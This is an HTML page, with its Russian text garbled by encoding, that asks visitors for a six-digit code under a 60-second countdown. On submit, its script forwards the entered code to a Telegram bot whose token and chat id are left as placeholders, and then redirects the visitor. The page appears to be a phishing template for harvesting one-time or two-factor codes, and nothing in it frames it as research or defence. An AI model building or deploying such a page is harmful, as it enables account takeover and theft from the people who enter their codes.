<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í–≤–æ–¥ –∫–æ–¥–∞</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }

        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }

        h2 {
            margin-bottom: 10px;
        }

        #timer {
            font-size: 16px;
            margin-bottom: 10px;
            color: red;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 18px;
        }

        button {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #ccc;
            cursor: not-allowed;
            transition: 0.3s;
        }

        button.active {
            background-color: #4a90e2;
            color: white;
            cursor: pointer;
        }

    </style>
</head>
<body>
    <div class="container">
        <h2>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ (6 —Ü–∏—Ñ—Ä)</h2>
        <div id="timer">60s</div>
        <input type="number" id="codeInput" maxlength="6" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥" />
        <button id="submitBtn" disabled>–û—Ç–ø—Ä–∞–≤–∏—Ç—å</button>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const codeInput = document.getElementById("codeInput");
            const submitBtn = document.getElementById("submitBtn");
            const timerElement = document.getElementById("timer");
            let countdown = 60;
            let timerInterval;

            // –¢–∞–π–º–µ—Ä –æ—Ç—Å—á–µ—Ç–∞
            function startTimer() {
                timerInterval = setInterval(function() {
                    countdown--;
                    timerElement.textContent = `${countdown}s`;

                    if (countdown <= 0) {
                        clearInterval(timerInterval);
                        // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ç–∞–π–º–µ—Ä–∞
                        window.location.href = "timeout.html";
                    }
                }, 1000);
            }

            // –ó–∞–ø—É—Å–∫ —Ç–∞–π–º–µ—Ä–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            startTimer();

            // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –∫–Ω–æ–ø–∫–∏, –∫–æ–≥–¥–∞ –≤–≤–µ–¥–µ–Ω –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∫–æ–¥
            codeInput.addEventListener("input", function() {
                const code = codeInput.value;
                if (code.length === 6 && /^\d{6}$/.test(code)) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            });

            // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞ –∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ
            submitBtn.addEventListener("click", function() {
                const code = codeInput.value;
                if (code.length === 6 && /^\d{6}$/.test(code)) {
                    // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞ –≤ Telegram
                    const token = "//bot token";
                    const chatId = "//id —á–∞—Ç–∞";
                    const message = `üë§ –í–≤–µ–¥—ë–Ω–Ω—ã–π –∫–æ–¥: ${code}`;

                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
                        .then(response => {
                            if (response.ok) {
                                alert("–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram!");
                                // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ –¥—Ä—É–≥—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
                                window.location.href = "index.html";
                            } else {
                                alert("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è.");
                            }
                        });
                }
            });
        });
    </script>
</body>
</html>
